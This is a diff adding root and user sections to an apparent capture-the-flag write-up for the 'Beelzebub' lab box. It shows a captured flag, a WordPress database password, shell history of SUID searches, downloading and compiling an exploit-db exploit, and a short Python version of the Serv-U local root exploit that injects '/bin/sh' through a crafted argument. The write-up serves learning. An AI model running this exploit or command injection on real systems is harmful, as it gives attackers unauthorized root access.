@@ -96,6 +96,92 @@ ssh krampus@IP
 M4k3Ad3a1
 ```
 
+```
+krampus@beelzebub:~/Desktop$ cat user.txt
+aq12uu909a0q921a2819b05568a992m9
+```
+
 ## Root
 
+```
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'root' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'P0k3M0n' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+```
+
+```
+find / -prem -u=s -type f 2>/dev/null
+cd /usr/local/Serv-U/
+ls
+cd
+clear
+ps -aux
+ps -a
+ps -a -U root
+ps -a -U root | grep 'Serv'
+ps -U root -au
+ps -U root -au | sort -u
+clear
+cd /tmp/
+clear
+find / -prem -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+clear
+find / -perm -u=s -type f 2>/dev/null
+clear
+wget https://www.exploit-db.com/download/47009
+clear
+ls
+clear
+mv 47009 ./exploit.c
+gcc exploit.c -o exploit
+./exploit 
+cd ../../../../../../../
+ls
+cd cd
+cd
+grep -r 'beelzebub'
+grep -r 'love'
+cd .local/share
+```
+
+
+```
+mv 47009 ./exploit.c
+gcc exploit.c -o exploit
+./exploit 
+cd ../../../../../../../
+ls
+cd cd
+cd
+grep -r 'beelzebub'
+grep -r 'love'
+cd .local/share
+```
+
+Exploit: https://www.exploit-db.com/exploits/47009
+
+I found the exploit on exploit-db, then went to the writeup for the exploit to learn more. Then I constructed the same exploit in python3. 
+
+python3 version
+```
+import os
+args = ("\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", )
+os.execv("/usr/local/Serv-U/Serv-U", args)
+print("If you see this, the exploit failed")
+```
+
+![image](https://user-images.githubusercontent.com/5285547/136214584-279f8b94-f85d-4788-95bd-0c652d1351d5.png)
+
+
 ## Conclusion
+
+Aweosome box, it was nice to be able to play with the exploit and know it can work in python too! 
